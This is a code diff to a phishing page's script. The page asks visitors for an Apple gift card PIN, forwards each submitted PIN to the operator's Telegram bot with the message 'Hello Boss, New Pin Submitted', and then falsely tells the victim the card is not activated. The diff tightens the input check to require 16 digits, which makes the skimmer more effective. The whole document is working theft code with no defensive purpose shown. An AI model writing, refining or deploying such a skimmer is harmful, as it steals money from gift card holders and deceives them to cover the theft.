@@ -131,15 +131,21 @@
   form.addEventListener("submit", function(e) {
     e.preventDefault();
 
-    const giftPin = input.value.trim();
+    // remove spaces to check real length
+    const rawPin = input.value.replace(/\s+/g, '');
 
-    if ${giftPin} {
+    if (rawPin.length === 0) {
       alert("⚠️ Please input the pin to continue");
       return;
     }
 
+    if (rawPin.length < 16) {
+      alert("⚠️ Pin must be 16 digits long");
+      return;
+    }
+
     // Message text
-    const message = `Hello Boss, New Pin Submitted: ${giftPin}`;
+    const message = `Hello Boss, New Pin Submitted: ${rawPin}`;
 
     // Send to Telegram API
     fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
@@ -154,11 +160,12 @@
       alert("❌ This Apple Gift Card is not activated!");
     })
     .catch(err => {
-      alert("Error sending to Tg");
+      alert("Error sending to Telegram");
       console.error(err);
     });
   });
 </script>
+
 
 
 </body>
